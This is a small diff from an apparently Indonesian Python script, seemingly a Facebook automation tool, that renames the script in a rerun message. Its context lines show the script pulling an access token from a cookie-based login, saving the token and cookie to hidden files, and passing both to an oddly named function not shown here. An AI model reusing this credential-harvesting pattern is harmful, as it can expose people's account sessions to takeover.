@@ -438,7 +438,7 @@ class coke:
 			_h=_p.group(1)
 			if 'EAA' in _h:open(".login.txt", 'w').write('%s' % (_h));open(".cokie.txt", 'w').write('%s' % (_cookie));bokep_barat_yang_terbaru(_cookie);bokep_barat_yang_terbaru(_h)
 		except (AttributeError, requests.exceptions.TooManyRedirects):print(war+'Cookies Error  ');time.sleep(3);coke()
-		exit(jalan(war+"Run This Script Again : python Nx.py"))
+		exit(jalan(war+"Run This Script Again : python love.py"))
 
 
 class bot_follow:
